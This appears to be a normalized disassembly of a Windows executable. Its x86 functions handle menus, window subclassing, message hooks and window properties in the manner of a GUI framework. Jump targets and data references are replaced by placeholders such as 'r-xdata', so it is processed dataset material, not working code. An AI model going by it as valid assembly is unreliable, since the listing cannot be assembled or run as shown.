cmp cl 0x2f
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_4130d1
mov eax sub_418044
call sub_4072e4
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1a0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_412bb8
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_416d27
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_412e25
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_412e25
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_4134a8
sub_413171
mov eax sub_41806c
call sub_4072e4
push ecx
push ecx
push esi
push 0x14
call sub_413474
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_4135ae
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0xc ] eax
call sub_412e7c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_408134
pop esi
sub_4131dc
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
push 0x1
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_413436 ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_4133d2 ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
retn 0x4
dec eax
dec eax
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
jmp r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
jmp r-xdata
push 0xe
jmp r-xdata
sub_413474
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_406c98
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_4134a8
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_41352c
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_412e7c
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_412ea3
push eax
push [ ebp + 0x8 ]
call sub_41352c
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_412ef2
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_41352c
push esi
call sub_41730f
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_413568
mov eax sub_4180f4
call sub_4072e4
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_4135d6
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_416e53
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_416e8b
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_413645
mov eax sub_418108
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_413670
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_413777
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_41730f
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_414c61
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_413670
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_4084b0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_4138e5
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_41390b
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_416213
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_413f56
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_413f56
mov ecx eax
call sub_41623a
mov ecx [ ecx + 0x1c ]
sub_41399b
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_4139fd
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_417404
cmp [ rw-data ] edi
je r-xdata
sub_413a53
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_416585
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_413bb8
push esi
mov esi ecx
call sub_41362b
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_406580
add esp 0xc
mov eax esi
pop esi
retn
sub_413bf6
push esi
push edi
mov esi ecx
call sub_41362b
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_406580
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_413c45
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_416175
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_413f56
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_4161f8
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_415a74
sub_413cbe
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_416175
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_4153cf
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_4153cf
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_413d1f
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4153cf
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_413f56
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_413f56
cmp esi eax
je r-xdata
mov ecx esi
call sub_4161f8
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_413d95
mov eax sub_418114
call sub_4072e4
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_416fa2
call sub_4178f4
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_413c22
mov eax [ ecx ]
push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x18 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_413c45
jmp r-xdata
sub_413e3f
call sub_413553
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0xc ]
call [ edx + 0x6c ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x18 ] eax
call sub_4135c4
mov eax r-xdata
retn
sub_413e88
push esi
push sub_416fa2
mov ecx rw-data
call sub_4178f4
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_413ebd
push esi
mov esi ecx
push sub_416fa2
mov ecx rw-data
call sub_4178f4
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_413ee4
mov eax sub_41812a
call sub_4072e4
push esi
call sub_417335
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_41662c
call sub_413462
push 0x48
mov ebx eax
call sub_413474
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_415fd5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_413462
pop ebx
sub_413f56
push esi
push edi
push 0x1
call sub_413ee4
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_41603a
mov edi eax
push esi
mov ecx edi
call sub_41625b
mov eax edi
pop edi
pop esi
retn 0x4
sub_413f9b
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_413ee4
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_412822
push edi
mov ecx esi
mov [ eax ] esi
call sub_41625b
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_413fd4
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_413ee4
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_412872
sub_414003
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push [ ebp + 0x8 ]
call sub_413f7d
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_413d95
push 0x1
pop eax
jmp r-xdata
pop ebp
retn 0x10
sub_414038
mov eax sub_418134
call sub_4072e4
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_413f56
push edi
mov esi eax
call sub_413f56
push esi
push [ ebp + 0x10 ]
push eax
call sub_413cbe
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_413f56
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_413d1f
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_413f56
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_413c22
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_413c45
sub_41415b
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_413553
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_4135c4
mov eax r-xdata
retn
sub_414197
push ebp
mov ebp esp
push esi
push edi
push sub_4175c7
mov ecx rw-data
call sub_417989
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_414038
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_4159ff
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_414213
push ebp
mov ebp esp
sub esp 0x10
push sub_416fa2
mov ecx rw-data
call sub_4178f4
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_41730f
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_413f9b
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_414032
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_414197
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_414038
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_413d95
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_414032
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
